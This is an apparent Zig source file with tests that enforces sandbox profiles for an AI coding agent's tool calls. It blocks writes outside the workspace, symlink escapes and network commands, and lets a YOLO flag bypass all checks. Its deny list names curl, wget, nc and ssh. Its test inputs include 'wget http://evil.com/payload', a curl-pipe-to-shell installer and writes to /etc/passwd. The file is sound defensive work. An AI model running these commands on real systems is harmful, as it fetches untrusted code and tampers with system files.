const std = @import("std");
const rt = @import("zcode_runtime");
const builtin = @import("builtin");
const env_mod = @import("env.zig");

pub const Decision = struct {
    allowed: bool,
    reason: []const u8,
};

/// Lightweight recent-sandbox-violation counter that backs the prompt-line
/// footer hint ("N sandbox violations (ctrl+o for details)"). The reference's
/// SandboxPromptFooterHint subscribes to a violation store and shows a single
/// transient hint with the recent count; we only need the count here -- the
/// "details" are the transcript/tool-trace the user already has.
///
/// Atomic so it stays correct if a sandbox enforcement denial is recorded
/// from a worker thread while the REPL render loop reads it on the main
/// thread. A single hint with a count (not one strip per violation) matches
/// the reference and avoids spamming the footer on a burst of denials.
var recent_violations: std.atomic.Value(usize) = std.atomic.Value(usize).init(0);

/// Increment the recent-violation counter. Called at each sandbox
/// enforcement-denial site so the footer can surface a hint.
pub fn recordViolation() void {
    _ = recent_violations.fetchAdd(1, .monotonic);
}

/// Read the recent-violation count without clearing it. Used by the per-frame
/// footer build to decide whether to show the hint and with what count.
pub fn peekRecentCount() usize {
    return recent_violations.load(.monotonic);
}

/// Read and reset the recent-violation count to zero. Used when the hint is
/// dismissed/acknowledged so the next burst starts fresh.
pub fn takeRecentCount() usize {
    return recent_violations.swap(0, .monotonic);
}

/// Reset the counter to zero. Exposed for tests so cases do not contaminate
/// each other through the module-level atomic.
pub fn resetRecentCount() void {
    recent_violations.store(0, .monotonic);
}

/// True when the sandbox profile name is the "no sandbox" setting.
/// Single source of truth used by the authorizer and the UI footer
/// red-highlight; keep this in lockstep with the profile string used
/// in authorizeToolYolo above.
pub fn isDangerProfile(profile: []const u8) bool {
    return std.mem.eql(u8, profile, "danger-full-access");
}

pub fn authorizeTool(profile: []const u8, cwd: []const u8, tool_name: []const u8, args: []const u8) Decision {
    return authorizeToolYolo(profile, cwd, tool_name, args, false);
}

/// YOLO-aware variant. When `yolo_mode` is true, the sandbox is bypassed
/// entirely (equivalent to `danger-full-access`). This matches user
/// expectation that enabling YOLO means "allow everything, don't ask" --
/// previously the sandbox still hard-blocked writes outside the workspace
/// even in YOLO, which surprised users running `mkdir /Users/…/Projects/`.
pub fn authorizeToolYolo(
    profile: []const u8,
    cwd: []const u8,
    tool_name: []const u8,
    args: []const u8,
    yolo_mode: bool,
) Decision {
    return authorizeToolYoloDirs(profile, cwd, &.{}, tool_name, args, yolo_mode);
}

/// Additional-working-directories variant. Paths inside any directory in
/// `extra_dirs` (registered via `/add-dir`) are treated as in-bounds just
/// like paths inside `cwd`, mirroring the reference's
/// `additionalWorkingDirectories` map (sandbox-adapter.ts:299
/// `allowWrite.push(...additionalDirs)`). `authorizeToolYolo` delegates here
/// with an empty slice so existing call sites and tests stay unchanged.
pub fn authorizeToolYoloDirs(
    profile: []const u8,
    cwd: []const u8,
    extra_dirs: []const []const u8,
    tool_name: []const u8,
    args: []const u8,
    yolo_mode: bool,
) Decision {
    if (yolo_mode) {
        return .{ .allowed = true, .reason = "" };
    }

    if (std.mem.eql(u8, profile, "danger-full-access")) {
        return .{ .allowed = true, .reason = "" };
    }

    if (workspacePathRequired(tool_name) and !validateWorkspacePaths(cwd, extra_dirs, args)) {
        return .{ .allowed = false, .reason = "sandbox blocks paths outside workspace" };
    }

    if (std.mem.eql(u8, profile, "read-only")) {
        if (matchesToolName(tool_name, &.{
            "file_write",   "Write",         "write",
            "file_edit",    "Edit",          "edit",
            "NotebookEdit", "notebook_edit", "git_apply",
            "GitApply",     "Task",          "task",
            "TaskCreate",   "task_create",   "TaskUpdate",
            "task_update",  "TaskStop",      "task_stop",
            "TaskOutput",   "task_output",   "TaskRun",
            "task_run",     "TeamCreate",    "team_create",
            "TeamDelete",   "team_delete",   "SendMessage",
            "send_message", "Move",          "move",
            "Copy",         "copy",          "Delete",
            "delete",       "GitCommit",     "git_commit",
            "RunTests",     "run_tests",
        })) {
            return .{ .allowed = false, .reason = "read-only sandbox blocks mutations" };
        }

        if (matchesToolName(tool_name, &.{ "shell", "Bash", "bash" })) {
            if (!hasShellSandboxBackend(profile) and !allowLegacyUnisolatedShell()) {
                return .{ .allowed = false, .reason = "sandbox requires an enforced shell isolation backend (sandbox-exec on macOS or bwrap on Linux). Set ZCODE_ALLOW_UNISOLATED_SHELL=1 only for unsafe legacy fallback." };
            }
            if (!isReadOnlyShell(args)) {
                return .{ .allowed = false, .reason = "read-only sandbox blocks mutating shell commands" };
            }
        }

        return .{ .allowed = true, .reason = "" };
    }

    if (std.mem.eql(u8, profile, "workspace-write")) {
        if (matchesToolName(tool_name, &.{ "shell", "Bash", "bash" }) and hasForbiddenNetworkCall(args)) {
            return .{ .allowed = false, .reason = "workspace-write sandbox blocks direct network shell calls" };
        }
        if (matchesToolName(tool_name, &.{ "shell", "Bash", "bash" }) and !hasShellSandboxBackend(profile) and !allowLegacyUnisolatedShell()) {
            return .{ .allowed = false, .reason = "sandbox requires an enforced shell isolation backend (sandbox-exec on macOS or bwrap on Linux). Set ZCODE_ALLOW_UNISOLATED_SHELL=1 only for unsafe legacy fallback." };
        }
        return .{ .allowed = true, .reason = "" };
    }

    if (std.mem.eql(u8, profile, "no-network")) {
        if (matchesToolName(tool_name, &.{
            "mcp_invoke",
            "WebFetch",
            "web_fetch",
            "WebSearch",
            "web_search",
            "HttpRequest",
            "http_request",
            "OpenPR",
            "open_pr",
        }) or std.mem.startsWith(u8, tool_name, "mcp::")) {
            return .{ .allowed = false, .reason = "no-network sandbox blocks MCP network calls" };
        }
        if (matchesToolName(tool_name, &.{ "shell", "Bash", "bash" }) and !hasShellSandboxBackend(profile) and !allowLegacyUnisolatedShell()) {
            return .{ .allowed = false, .reason = "sandbox requires an enforced shell isolation backend (sandbox-exec on macOS or bwrap on Linux). Set ZCODE_ALLOW_UNISOLATED_SHELL=1 only for unsafe legacy fallback." };
        }
        if (matchesToolName(tool_name, &.{ "shell", "Bash", "bash" }) and hasForbiddenNetworkCall(args)) {
            return .{ .allowed = false, .reason = "no-network sandbox blocks network shell calls" };
        }
        return .{ .allowed = true, .reason = "" };
    }

    return .{ .allowed = false, .reason = "unknown sandbox profile" };
}

pub fn requiresEnforcedShellSandbox(profile: []const u8) bool {
    return std.mem.eql(u8, profile, "read-only") or
        std.mem.eql(u8, profile, "workspace-write") or
        std.mem.eql(u8, profile, "no-network");
}

pub fn hasShellSandboxBackend(profile: []const u8) bool {
    if (!requiresEnforcedShellSandbox(profile)) return true;

    return switch (builtin.os.tag) {
        .macos => fileExistsAbsolute("/usr/bin/sandbox-exec"),
        .linux => fileExistsAbsolute("/usr/bin/bwrap") or
            fileExistsAbsolute("/bin/bwrap") or
            fileExistsAbsolute("/usr/local/bin/bwrap"),
        else => false,
    };
}

pub fn allowLegacyUnisolatedShell() bool {
    return envFlag("ZCODE_ALLOW_UNISOLATED_SHELL");
}

fn workspacePathRequired(tool_name: []const u8) bool {
    return matchesToolName(tool_name, &.{
        "file_read",    "Read",          "read",
        "file_write",   "Write",         "write",
        "file_edit",    "Edit",          "edit",
        "NotebookEdit", "notebook_edit", "Move",
        "move",         "Copy",          "copy",
        "Delete",       "delete",        "ListDir",
        "list_dir",     "Stat",          "stat",
        "GitDiff",      "git_diff",      "Task",
        "task",         "TaskCreate",    "task_create",
        "TaskGet",      "task_get",      "TaskUpdate",
        "task_update",  "TaskList",      "task_list",
        "TaskStop",     "task_stop",     "TaskOutput",
        "task_output",  "TaskRun",       "task_run",
        "TaskPoll",     "task_poll",
    });
}

fn validateWorkspacePaths(cwd: []const u8, extra_dirs: []const []const u8, args: []const u8) bool {
    const keys = [_][]const u8{ "path", "from", "to", "src", "dst", "output_path", "exit_path" };
    for (keys) |key| {
        if (extractArg(args, key)) |value| {
            if (!pathWithinWorkspace(cwd, extra_dirs, value)) return false;
        }
    }
    return true;
}

fn extractArg(args: []const u8, key: []const u8) ?[]const u8 {
    var i: usize = 0;
    while (i < args.len) {
        while (i < args.len and (args[i] == ';' or args[i] == ',' or args[i] == '\n' or std.ascii.isWhitespace(args[i]))) : (i += 1) {}
        if (i >= args.len) break;

        const start = i;
        var depth: usize = 0;
        var in_string = false;
        var quote: u8 = 0;
        scan: while (i < args.len) : (i += 1) {
            const ch = args[i];
            if (in_string) {
                if (ch == '\\' and i + 1 < args.len) {
                    i += 1;
                    continue;
                }
                if (ch == quote) {
                    in_string = false;
                    quote = 0;
                }
                continue;
            }
            switch (ch) {
                '"', '\'' => {
                    in_string = true;
                    quote = ch;
                },
                '[', '{', '(' => depth += 1,
                ']', '}', ')' => {
                    if (depth > 0) depth -= 1;
                },
                ';', ',', '\n' => {
                    if (depth == 0) break :scan;
                },
                else => {},
            }
        }

        const pair = std.mem.trim(u8, args[start..i], " \t");
        const sep = std.mem.indexOfScalar(u8, pair, '=') orelse std.mem.indexOfScalar(u8, pair, ':') orelse {
            if (i < args.len) i += 1;
            continue;
        };
        const k = std.mem.trim(u8, pair[0..sep], " \t\"'");
        var v = std.mem.trim(u8, pair[sep + 1 ..], " \t");
        if (v.len >= 2 and ((v[0] == '"' and v[v.len - 1] == '"') or (v[0] == '\'' and v[v.len - 1] == '\''))) {
            v = v[1 .. v.len - 1];
        }
        if (std.mem.eql(u8, k, key)) return v;

        if (i < args.len and (args[i] == ';' or args[i] == ',' or args[i] == '\n')) i += 1;
    }
    return null;
}

/// In-bounds when the path resolves within `cwd` OR within any directory in
/// `extra_dirs`. A relative path is resolved against `cwd` (extra dirs are
/// absolute roots, so a bare relative path is only ever workspace-relative).
fn pathWithinWorkspace(cwd: []const u8, extra_dirs: []const []const u8, raw_path: []const u8) bool {
    const path = std.mem.trim(u8, raw_path, " \t\"'");
    if (path.len == 0) return true;
    if (std.mem.eql(u8, path, ".")) return true;
    if (std.mem.eql(u8, path, "./")) return true;

    if (!std.fs.path.isAbsolute(path)) {
        if (containsParentTraversal(path)) return false;
        // Relative paths are interpreted against cwd only (the working
        // directory). Extra dirs are alternative absolute roots that file
        // operations reach via absolute paths -- resolving a bare relative
        // path against them would let an unrelated extra root rescue a
        // symlink that escapes cwd, so we deliberately do not do that.
        return resolvedPathWithin(cwd, path);
    }

    if (absolutePathWithinRoot(cwd, path)) return true;
    for (extra_dirs) |root| {
        if (absolutePathWithinRoot(root, path)) return true;
    }
    return false;
}

/// True when `abs_path` resolves within `root` (symlinks followed first,
/// then a plain string-prefix check for paths that do not exist yet).
fn absolutePathWithinRoot(root: []const u8, abs_path: []const u8) bool {
    // Try resolving symlinks first.
    if (resolvedAbsolutePathWithin(root, abs_path)) return true;

    // Fall back to string prefix check for paths that don't exist yet.
    if (std.mem.eql(u8, abs_path, root)) return true;
    if (!std.mem.startsWith(u8, abs_path, root)) return false;
    if (root.len == 0) return false;
    if (root[root.len - 1] == '/') return true;
    if (abs_path.len == root.len) return true;
    return abs_path[root.len] == '/';
}

fn resolvedPathWithin(cwd: []const u8, rel_path: []const u8) bool {
    // Resolve workspace-relative path through the filesystem to catch symlinks
    // that target locations outside the workspace.
    var buf: [std.fs.max_path_bytes]u8 = undefined;
    var fba = std.heap.FixedBufferAllocator.init(&buf);
    // Fail-closed on allocation failure: if we can't even build the joined path, deny.
    const joined = std.fs.path.join(fba.allocator(), &.{ cwd, rel_path }) catch return false;
    return resolvedOrJoinedPathWithin(fba.allocator(), cwd, joined);
}

fn resolvedAbsolutePathWithin(cwd: []const u8, abs_path: []const u8) bool {
    var buf: [std.fs.max_path_bytes]u8 = undefined;
    var fba = std.heap.FixedBufferAllocator.init(&buf);
    return resolvedOrJoinedPathWithin(fba.allocator(), cwd, abs_path);
}

fn realPathAlloc(allocator: std.mem.Allocator, path: []const u8) ![]u8 {
    var buf: [std.fs.max_path_bytes]u8 = undefined;
    const n = if (std.fs.path.isAbsolute(path))
        try std.Io.Dir.realPathFileAbsolute(rt.io, path, &buf)
    else
        try std.Io.Dir.cwd().realPathFile(rt.io, path, &buf);
    return allocator.dupe(u8, buf[0..n]);
}

fn resolvedOrJoinedPathWithin(allocator: std.mem.Allocator, cwd: []const u8, path: []const u8) bool {
    if (realPathAlloc(allocator, path)) |resolved| {
        return absolutePathWithin(cwd, resolved);
    } else |_| {}

    var probe = path;
    while (std.fs.path.dirname(probe)) |parent| {
        if (parent.len == probe.len) break;

        if (realPathAlloc(allocator, parent)) |resolved_parent| {
            const suffix = std.mem.trimStart(u8, path[parent.len..], "/\\");
            if (suffix.len == 0) return absolutePathWithin(cwd, resolved_parent);

            const combined = std.fs.path.join(allocator, &.{ resolved_parent, suffix }) catch return false;
            return absolutePathWithin(cwd, combined);
        } else |_| {}

        probe = parent;
    }

    return absolutePathWithin(cwd, path);
}

fn absolutePathWithin(cwd: []const u8, path: []const u8) bool {
    if (std.mem.eql(u8, path, cwd)) return true;
    if (!std.mem.startsWith(u8, path, cwd)) return false;
    if (cwd.len == 0) return false;
    if (cwd[cwd.len - 1] == '/') return true;
    if (path.len == cwd.len) return true;
    return path[cwd.len] == '/';
}

fn containsParentTraversal(path: []const u8) bool {
    var parts = std.mem.splitScalar(u8, path, '/');
    while (parts.next()) |part| {
        if (std.mem.eql(u8, part, "..")) return true;
    }
    return false;
}

fn envFlag(name: []const u8) bool {
    // Centralised helper -- accepts "1", "true", "yes", AND "on", which
    // the previous local implementation here did not. That asymmetry
    // bit users who set ZCODE_ALLOW_UNISOLATED_SHELL=on and were
    // confused why the sandbox still wrapped them.
    return env_mod.isEnvTruthy(name);
}

fn fileExistsAbsolute(path: []const u8) bool {
    std.Io.Dir.accessAbsolute(rt.io, path, .{}) catch return false;
    return true;
}

fn hasForbiddenNetworkCall(args: []const u8) bool {
    const command = extractArg(args, "command") orelse args;
    return containsShellWord(command, "curl") or
        containsShellWord(command, "wget") or
        containsShellWord(command, "nc") or
        containsShellWord(command, "ssh") or
        containsShellWord(command, "scp") or
        containsShellWord(command, "ftp") or
        containsIgnoreCase(command, "ollama pull") or
        containsIgnoreCase(command, "docker pull") or
        containsIgnoreCase(command, "git clone") or
        containsIgnoreCase(command, "pip install") or
        containsIgnoreCase(command, "python -m pip install") or
        containsIgnoreCase(command, "uv pip install") or
        containsIgnoreCase(command, "npm install") or
        containsIgnoreCase(command, "pnpm install") or
        containsIgnoreCase(command, "yarn add") or
        containsIgnoreCase(command, "bun add") or
        containsIgnoreCase(command, "brew install") or
        containsIgnoreCase(command, "apt install") or
        containsIgnoreCase(command, "apt-get install") or
        containsIgnoreCase(command, "yum install") or
        containsIgnoreCase(command, "dnf install") or
        containsIgnoreCase(command, "pacman -s") or
        containsAny(command, &.{ "http://", "https://" });
}

fn isReadOnlyShell(args: []const u8) bool {
    const bash_security = @import("../tools/bash_security.zig");
    const command = extractArg(args, "command") orelse args;
    if (hasForbiddenNetworkCall(args)) return false;
    // Delegate mutation detection to the canonical bash_security module
    return !bash_security.isMutatingCommand(command);
}

fn containsShellWord(command: []const u8, needle: []const u8) bool {
    if (needle.len == 0 or needle.len > command.len) return false;

    var i: usize = 0;
    while (i + needle.len <= command.len) : (i += 1) {
        var j: usize = 0;
        while (j < needle.len) : (j += 1) {
            if (std.ascii.toLower(command[i + j]) != std.ascii.toLower(needle[j])) break;
        }
        if (j != needle.len) continue;

        const left_ok = i == 0 or !isWordCharacter(command[i - 1]);
        const right_idx = i + needle.len;
        const right_ok = right_idx >= command.len or !isWordCharacter(command[right_idx]);
        if (left_ok and right_ok) return true;
    }
    return false;
}

const containsIgnoreCase = @import("parse_helpers.zig").containsIgnoreCase;

/// Returns true if the byte is a word-constituent character (alphanumeric or underscore),
/// used for whole-word boundary matching in shell command detection.
fn isWordCharacter(ch: u8) bool {
    return std.ascii.isAlphanumeric(ch) or ch == '_';
}

fn containsAny(haystack: []const u8, needles: []const []const u8) bool {
    for (needles) |needle| {
        if (std.mem.indexOf(u8, haystack, needle) != null) return true;
    }
    return false;
}

fn matchesToolName(name: []const u8, set: []const []const u8) bool {
    for (set) |candidate| {
        if (std.mem.eql(u8, name, candidate)) return true;
    }
    return false;
}

const testing = std.testing;

test "read-only blocks file_write" {
    const d = authorizeTool("read-only", ".", "file_write", "path=a;content=b");
    try testing.expect(!d.allowed);
}

test "danger allows shell" {
    const d = authorizeTool("danger-full-access", ".", "shell", "command=rm -rf tmp");
    try testing.expect(d.allowed);
}

test "workspace-write blocks absolute path outside cwd" {
    const d = authorizeTool("workspace-write", "/repo/work", "file_read", "path=/etc/passwd");
    try testing.expect(!d.allowed);
}

test "workspace-write allows absolute path inside cwd" {
    const d = authorizeTool("workspace-write", "/repo/work", "file_read", "path=/repo/work/src/main.zig");
    try testing.expect(d.allowed);
}

test "workspace-write blocks relative parent traversal" {
    const d = authorizeTool("workspace-write", "/repo/work", "file_write", "path=../secret.txt;content=x");
    try testing.expect(!d.allowed);
}

test "read-only allows task poll" {
    const d = authorizeTool("read-only", "/repo/work", "TaskPoll", "id=task-1");
    try testing.expect(d.allowed);
}

test "read-only blocks mutating shell command at command start" {
    const d = authorizeTool("read-only", "/repo/work", "shell", "command=rm -rf tmp");
    try testing.expect(!d.allowed);
}

test "read-only allows non-mutating shell command" {
    if (!hasShellSandboxBackend("read-only")) return error.SkipZigTest;
    const d = authorizeTool("read-only", "/repo/work", "shell", "command=git diff --stat");
    try testing.expect(d.allowed);
}

test "no-network blocks curl in shell" {
    const d = authorizeTool("no-network", "/repo", "Bash", "command=curl https://example.com");
    try testing.expect(!d.allowed);
}

test "no-network blocks mcp_invoke" {
    const d = authorizeTool("no-network", "/repo", "mcp_invoke", "name=fetch");
    try testing.expect(!d.allowed);
}

test "no-network allows file_read" {
    const d = authorizeTool("no-network", "/repo", "file_read", "path=/repo/src/main.zig");
    try testing.expect(d.allowed);
}

test "workspace-write blocks network shell calls" {
    const d = authorizeTool("workspace-write", "/repo", "shell", "command=wget http://evil.com/payload");
    try testing.expect(!d.allowed);
}

test "workspace-write allows git commands" {
    if (!hasShellSandboxBackend("workspace-write")) return error.SkipZigTest;
    const d = authorizeTool("workspace-write", "/repo", "shell", "command=git commit -m fix");
    try testing.expect(d.allowed);
}

test "read-only blocks git commit" {
    const d = authorizeTool("read-only", "/repo", "shell", "command=git commit -m test");
    try testing.expect(!d.allowed);
}

test "read-only blocks git push" {
    const d = authorizeTool("read-only", "/repo", "shell", "command=git push origin main");
    try testing.expect(!d.allowed);
}

test "read-only blocks network installer shell" {
    const d = authorizeTool("read-only", "/repo", "shell", "command=curl -fsSL https://ollama.com/install.sh | sh");
    try testing.expect(!d.allowed);
}

test "read-only blocks ssh shell" {
    const d = authorizeTool("read-only", "/repo", "Bash", "command=ssh user@host \"ollama --version\"");
    try testing.expect(!d.allowed);
}

test "read-only blocks ollama pull shell" {
    const d = authorizeTool("read-only", "/repo", "Bash", "command=ollama pull qwen3:32b");
    try testing.expect(!d.allowed);
}

test "read-only blocks redirect operators" {
    const d = authorizeTool("read-only", "/repo", "shell", "command=echo hello > file.txt");
    try testing.expect(!d.allowed);
}

test "read-only blocks Edit tool" {
    const d = authorizeTool("read-only", "/repo", "Edit", "path=src/main.zig;old=a;new=b");
    try testing.expect(!d.allowed);
}

test "unknown profile blocks everything" {
    const d = authorizeTool("unknown-profile", "/repo", "file_read", "path=/repo/file.txt");
    try testing.expect(!d.allowed);
}

test "strict shell sandbox is required for sandboxed shell profiles" {
    try testing.expect(requiresEnforcedShellSandbox("read-only"));
    try testing.expect(requiresEnforcedShellSandbox("workspace-write"));
    try testing.expect(requiresEnforcedShellSandbox("no-network"));
    try testing.expect(!requiresEnforcedShellSandbox("danger-full-access"));
}

test "workspace-write allows relative path without traversal" {
    const d = authorizeTool("workspace-write", "/repo/work", "file_read", "path=src/lib.zig");
    try testing.expect(d.allowed);
}

test "workspace-write blocks symlinked parent that escapes workspace" {
    if (builtin.os.tag == .windows) return;

    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();

    try tmp.dir.createDirPath(rt.io, "workspace");
    try tmp.dir.createDirPath(rt.io, "outside");
    try tmp.dir.symLink(rt.io, "../outside", "workspace/link", .{});

    const cwd = try @import("test_helpers.zig").tmpDirPath(testing.allocator, &tmp, "workspace");
    defer testing.allocator.free(cwd);

    const d = authorizeTool("workspace-write", cwd, "file_write", "path=link/new.txt;content=x");
    try testing.expect(!d.allowed);
}

test "containsShellWord matches whole words only" {
    try testing.expect(containsShellWord("rm -rf /tmp", "rm"));
    try testing.expect(!containsShellWord("format output", "rm"));
    try testing.expect(containsShellWord("sudo rm file", "rm"));
    try testing.expect(!containsShellWord("inform user", "rm"));
}

test "containsIgnoreCase works across case" {
    try testing.expect(containsIgnoreCase("Git Apply patch", "git apply"));
    try testing.expect(!containsIgnoreCase("gi", "git apply"));
}

test "extractArg finds key-value pairs" {
    try testing.expectEqualStrings("/tmp/file.txt", extractArg("path=/tmp/file.txt;content=hello", "path").?);
    try testing.expectEqualStrings("hello", extractArg("path=/tmp/file.txt;content=hello", "content").?);
    try testing.expect(extractArg("path=/tmp/file.txt", "missing") == null);
}

test "yolo mode bypasses workspace-write path guard" {
    // Without yolo, workspace-write blocks a write outside cwd.
    const locked = authorizeToolYolo("workspace-write", "/repo/work", "file_write", "path=/etc/passwd;content=x", false);
    try testing.expect(!locked.allowed);

    // With yolo, same call is allowed -- "everything goes" when user opted in.
    const yolo = authorizeToolYolo("workspace-write", "/repo/work", "file_write", "path=/etc/passwd;content=x", true);
    try testing.expect(yolo.allowed);
}

test "yolo mode bypasses read-only mutation block" {
    // Without yolo, read-only blocks mkdir-style shell mutation.
    const locked = authorizeToolYolo("read-only", "/repo", "shell", "command=mkdir -p /tmp/foo", false);
    try testing.expect(!locked.allowed);

    // With yolo, allowed.
    const yolo = authorizeToolYolo("read-only", "/repo", "shell", "command=mkdir -p /tmp/foo", true);
    try testing.expect(yolo.allowed);
}

test "yolo mode bypasses no-network curl block" {
    const locked = authorizeToolYolo("no-network", "/repo", "Bash", "command=curl https://example.com", false);
    try testing.expect(!locked.allowed);

    const yolo = authorizeToolYolo("no-network", "/repo", "Bash", "command=curl https://example.com", true);
    try testing.expect(yolo.allowed);
}

test "extra workspace dir allows reads inside a sibling directory" {
    const d = authorizeToolYoloDirs(
        "workspace-write",
        "/repo",
        &.{"/sibling"},
        "file_read",
        "path=/sibling/x.zig",
        false,
    );
    try testing.expect(d.allowed);
}

test "without the extra dir the sibling path is blocked" {
    const d = authorizeToolYoloDirs(
        "workspace-write",
        "/repo",
        &.{},
        "file_read",
        "path=/sibling/x.zig",
        false,
    );
    try testing.expect(!d.allowed);
}

test "path outside both cwd and extra dirs is blocked" {
    const d = authorizeToolYoloDirs(
        "workspace-write",
        "/repo",
        &.{"/sibling"},
        "file_read",
        "path=/etc/passwd",
        false,
    );
    try testing.expect(!d.allowed);
}

test "extra dir is honored for a real path inside it" {
    if (builtin.os.tag == .windows) return;

    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();

    try tmp.dir.createDirPath(rt.io, "workspace");
    try tmp.dir.createDirPath(rt.io, "extra");
    {
        const f = try tmp.dir.createFile(rt.io, "extra/ok.txt", .{});
        f.close(rt.io);
    }

    const cwd = try @import("test_helpers.zig").tmpDirPath(testing.allocator, &tmp, "workspace");
    defer testing.allocator.free(cwd);
    const extra = try @import("test_helpers.zig").tmpDirPath(testing.allocator, &tmp, "extra");
    defer testing.allocator.free(extra);

    // The file lives under the extra root and outside cwd; honored only because
    // the extra root is authorized.
    const ok_path = try std.fs.path.join(testing.allocator, &.{ extra, "ok.txt" });
    defer testing.allocator.free(ok_path);
    const ok_args = try std.fmt.allocPrint(testing.allocator, "path={s}", .{ok_path});
    defer testing.allocator.free(ok_args);

    const allowed = authorizeToolYoloDirs("workspace-write", cwd, &.{extra}, "file_read", ok_args, false);
    try testing.expect(allowed.allowed);

    const without = authorizeToolYoloDirs("workspace-write", cwd, &.{}, "file_read", ok_args, false);
    try testing.expect(!without.allowed);
}

test "symlink escaping all roots is still blocked even with an extra dir" {
    if (builtin.os.tag == .windows) return;

    var tmp = testing.tmpDir(.{});
    defer tmp.cleanup();

    try tmp.dir.createDirPath(rt.io, "workspace");
    try tmp.dir.createDirPath(rt.io, "extra");
    try tmp.dir.createDirPath(rt.io, "outside");
    // The symlink lives inside cwd and escapes to `outside`. A relative path
    // through it is resolved against cwd, exercising symlink resolution
    // (no string-prefix fallback). The extra root being present must not
    // rescue an escape that lands outside every authorized root.
    try tmp.dir.symLink(rt.io, "../outside", "workspace/link", .{});

    const cwd = try @import("test_helpers.zig").tmpDirPath(testing.allocator, &tmp, "workspace");
    defer testing.allocator.free(cwd);
    const extra = try @import("test_helpers.zig").tmpDirPath(testing.allocator, &tmp, "extra");
    defer testing.allocator.free(extra);

    const blocked = authorizeToolYoloDirs("workspace-write", cwd, &.{extra}, "file_write", "path=link/new.txt;content=x", false);
    try testing.expect(!blocked.allowed);
}

test "recordViolation counts and takeRecentCount resets" {
    resetRecentCount();
    try testing.expectEqual(@as(usize, 0), peekRecentCount());

    recordViolation();
    recordViolation();
    try testing.expectEqual(@as(usize, 2), peekRecentCount());
    // peek does not clear.
    try testing.expectEqual(@as(usize, 2), peekRecentCount());

    // take returns the count and resets to zero.
    try testing.expectEqual(@as(usize, 2), takeRecentCount());
    try testing.expectEqual(@as(usize, 0), peekRecentCount());
}

test "yolo mode allows mkdir outside workspace (the reported bug)" {
    // This is the exact scenario from the bug report: yolo + workspace-write
    // tried to run `mkdir -p /Users/example/Projects/kali/portfolio-zhirayr`
    // while cwd was /Users/example/Documents/zig-code. Sandbox denied it as
    // "outside workspace". Yolo should override.
    const d = authorizeToolYolo(
        "workspace-write",
        "/Users/example/Documents/zig-code",
        "shell",
        "command=mkdir -p /Users/example/Projects/kali/portfolio-zhirayr",
        true,
    );
    try testing.expect(d.allowed);
}
